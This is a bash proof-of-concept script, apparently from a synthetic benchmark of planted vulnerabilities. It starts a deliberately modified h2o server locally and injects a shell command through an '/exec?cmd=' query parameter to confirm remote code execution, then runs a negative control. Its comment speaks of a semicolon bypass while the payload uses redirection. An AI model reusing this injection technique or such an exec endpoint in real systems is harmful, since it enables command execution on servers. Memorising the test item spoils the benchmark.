#!/usr/bin/env bash
# PoC for 089_h2o_C3I2S2
# Axes: C3 (three flags + utility function) / I2 (snprintf buffer) / S2 (pipe blocked, bypass with ;)
#
# Usage: ./PoC.sh
# Expected: prints uid= line confirming RCE as the server process user.
#
# The patched binary (h2o) lives in this directory. If absent, run:
#   cd $(dirname $0) && bash build.sh

set -euo pipefail

SAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="$SAMPLE_DIR/h2o"
WWWROOT="/tmp/poc_089_www"
MARKER="/tmp/poc_089_marker"
PORT=18089
NEG_PORT=19089

if [[ ! -x "$BINARY" ]]; then
    echo "[-] binary not found at $BINARY — run build.sh first" >&2
    exit 1
fi

SERVER_PID=0

cleanup() {
    [[ $SERVER_PID -ne 0 ]] && { kill "$SERVER_PID" 2>/dev/null || true; wait "$SERVER_PID" 2>/dev/null || true; }
    rm -rf "$WWWROOT" "$MARKER" /tmp/poc_089_h2o.conf /tmp/poc_089_neg.conf
}
trap cleanup EXIT

mkdir -p "$WWWROOT"

CONF=/tmp/poc_089_h2o.conf
cat > "$CONF" <<YAML
listen:
  host: 127.0.0.1
  port: ${PORT}
hosts:
  "127.0.0.1:${PORT}":
    paths:
      /:
        file.dir: ${WWWROOT}
access-log: /dev/null
error-log: /dev/null
YAML

# ── start server with all three C3 exec flags ─────────────────────────────────
echo "[*] starting h2o with --exec-mode, --exec-verbose, --exec-debug on port $PORT..."
"$BINARY" -c "$CONF" --exec-mode --exec-verbose --exec-debug &
SERVER_PID=$!
sleep 0.6

# ── trigger exploit: pipe blocked (S2) but semicolon works ────────────────────
echo "[*] sending payload: cmd=id>${MARKER}"
curl -sf "http://127.0.0.1:${PORT}/exec?cmd=id>${MARKER}" > /dev/null || true

# ── verify ─────────────────────────────────────────────────────────────────────
if [[ -f "$MARKER" ]]; then
    echo "[+] RCE confirmed. Server executed:"
    cat "$MARKER"
else
    echo "[-] marker file not found — exploit failed"
    exit 1
fi

# ── negative control: missing --exec-debug means exec_config_ok() returns 0 ───
echo "[*] verifying gate: endpoint absent without --exec-debug..."
kill "$SERVER_PID" 2>/dev/null; wait "$SERVER_PID" 2>/dev/null || true
SERVER_PID=0

NEG_CONF=/tmp/poc_089_neg.conf
cat > "$NEG_CONF" <<YAML
listen:
  host: 127.0.0.1
  port: ${NEG_PORT}
hosts:
  "127.0.0.1:${NEG_PORT}":
    paths:
      /:
        file.dir: ${WWWROOT}
access-log: /dev/null
error-log: /dev/null
YAML

"$BINARY" -c "$NEG_CONF" --exec-mode --exec-verbose &
SAFE_PID=$!
sleep 0.6
HTTP_CODE=$(curl -sf -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:${NEG_PORT}/exec?cmd=id" || true)
kill "$SAFE_PID" 2>/dev/null; wait "$SAFE_PID" 2>/dev/null || true

if [[ "$HTTP_CODE" == "404" ]]; then
    echo "[+] gate check passed: got 404 without --exec-debug"
else
    echo "[!] gate check unexpected response: $HTTP_CODE"
fi
